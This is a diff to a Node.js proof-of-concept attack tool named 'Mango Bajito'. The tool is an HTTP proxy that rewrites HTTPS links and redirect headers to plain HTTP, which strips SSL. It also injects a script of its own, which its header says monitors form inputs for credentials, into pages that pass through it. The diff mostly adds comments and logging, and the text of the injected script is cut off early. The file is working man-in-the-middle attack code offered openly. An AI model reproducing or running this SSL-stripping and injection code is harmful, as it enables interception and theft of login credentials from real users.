@@ -1,11 +1,22 @@
+/*
+Mango Bajito: pre-SSL authentication token hijack PoC
+Evil javascript injection that monitors input values for credentials and strips SSL resources on login forms
+
+XenoMuta - http://xenomuta.com/
+xenomuta at gmail.com
+*/
 var http = require('http');
-var m4ng0b4j1t0 = require('fs').readFileSync(__filename).toString().split("::SP" + "LIT::")[1];
-var mangos = {}, mango_display_timer;
+var PORT = 8888, mangos = {}, mango_display_timer;
+
+/* Read 'mangobajito' script out off myself */
+var m4ng0b4j1t0 = require('fs').readFileSync(__filename, 'utf-8').split("::SP" + "LIT::")[1];
+
+/* SSL stripping function */
 var mangobajito = function (chunk, headers, host) {
   if (!chunk) return chunk;
   var l = chunk.length, s = chunk.toString()
   // Strip SSL
-  while (/https:/.test(s)) s = s.replace(/https:/g, 'http:')  
+  while (/https:/.test(s)) s = s.replace(/https:/g, 'http:')
   if (/javascript/.test(headers['content-type'])) {
     chunk = new Buffer(s + "\n" + m4ng0b4j1t0);
   } else if (/<head/i.test(s)) {
@@ -17,14 +28,15 @@ var mangobajito = function (chunk, headers, host) {
   return chunk
 }
 
-http.createServer(function (req, res) {  
-  // Avoid gzip encoding
+http.createServer(function (req, res) {
+  // Force avoiding gzip encoding
   req.headers['accept-encoding'] = 'none';
-  // Try to skip ssl
+  // Try to skip SSL
   var host = req.headers.host;
   var port = 80;
   if (/:/.test(host)) port = Number(host.replace(/.*:/,''));
 
+  // fake route to mangobajito's injected script
   if (/\/get_m4ng0b4j1t0/.test(req.url)) {
     console.log("* Injected MangoBajito on " + host);
     res.writeHead(200, { host: host, 'content-type': 'application/javascript' });
@@ -54,13 +66,12 @@ http.createServer(function (req, res) {
     if (/get/i.test(req.method) && response.headers['content-length']) {
       delete response.headers['content-length']
     }
-    (['refresh', 'location']).forEach(function(h){    
+    (['refresh', 'location']).forEach(function(h){
       if (/https:/i.test(response.headers[h])) {
-        // console.log("SSL>>",h,response.headers[h])
         response.headers[h] = response.headers[h].replace(/https:/gi,'http:')
       }
     })
-    response.on('data', function (chunk) {      
+    response.on('data', function (chunk) {
       if (response.headers['content-type'] && /text\//.test(response.headers['content-type']))
         chunk = mangobajito(chunk, response.headers, host);
       if (!header_sent) res.writeHead(response.statusCode, response.headers);
@@ -83,8 +94,10 @@ http.createServer(function (req, res) {
   } else {
     httpreq.end();
   }
-}).listen(8888, '127.0.0.1');
+}).listen(PORT, '127.0.0.1');
+console.log("* MangoBajito listening on port " + PORT);
 return;
+/* Mango Bajito script after the break */
 //::SPLIT::
 function __m4ng0b4j1t0__(){
   if(window._m4ng0b4j1t0_)return;
